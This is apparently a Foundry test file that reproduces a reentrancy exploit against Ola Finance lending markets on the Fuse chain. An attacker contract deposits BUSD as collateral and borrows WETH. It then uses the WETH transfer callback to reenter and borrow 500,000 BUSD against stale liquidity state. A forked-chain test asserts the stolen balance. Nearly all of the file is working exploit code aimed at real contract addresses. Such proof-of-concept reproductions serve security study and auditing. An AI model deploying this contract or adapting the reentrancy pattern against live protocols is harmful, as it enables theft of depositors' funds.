// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface IOlaMarket {
    function mint(
        uint256 amount
    ) external returns (uint256);
    function borrow(
        uint256 amount
    ) external returns (uint256);
}

interface IOlaComptroller {
    function enterMarkets(
        address[] calldata markets
    ) external returns (uint256[] memory);
}

contract OlaAttacker {
    IERC20 private constant WETH = IERC20(0xa722c13135930332Eb3d749B2F0906559D2C5b99);
    IERC20 private constant BUSD = IERC20(0x6a5F6A8121592BeCd6747a38d67451B310F7f156);
    IOlaMarket private constant O_WETH = IOlaMarket(0x139Eb08579eec664d461f0B754c1F8B569044611);
    IOlaMarket private constant O_BUSD = IOlaMarket(0xBaAFD1F5e3846C67465FCbb536a52D5d8f484Abc);
    IOlaComptroller private constant COMPTROLLER = IOlaComptroller(0x26a562B713648d7F3D1E1031DCc0860A4F3Fa340);

    bool private reentered;

    function attack() external {
        uint256 busdBalance = BUSD.balanceOf(address(this));
        BUSD.approve(address(O_BUSD), busdBalance);
        require(O_BUSD.mint(busdBalance) == 0, "mint failed");

        address[] memory markets = new address[](1);
        markets[0] = address(O_BUSD);
        COMPTROLLER.enterMarkets(markets);

        // WETH invokes onTokenTransfer before Ola finishes updating this account's
        // borrow state. The callback uses the stale liquidity to borrow BUSD too.
        require(O_WETH.borrow(40 ether) == 0, "WETH borrow failed");
    }

    function onTokenTransfer(address, uint256, bytes calldata) external {
        if (!reentered && msg.sender == address(WETH)) {
            reentered = true;
            require(O_BUSD.borrow(500_000 ether) == 0, "reentrant BUSD borrow failed");
        }
    }
}

contract OlaFinanceExploitTest is Test {
    IERC20 private constant BUSD = IERC20(0x6a5F6A8121592BeCd6747a38d67451B310F7f156);

    function testExploit() public {
        // Fuse's public archive RPCs currently omit mixHash on historical PoA blocks.
        vm.createSelectFork("https://fuse.drpc.org", 16_257_352);
        OlaAttacker attacker = new OlaAttacker();
        deal(address(BUSD), address(attacker), 1_000_000 ether);

        attacker.attack();

        assertEq(BUSD.balanceOf(address(attacker)), 500_000 ether);
    }
}
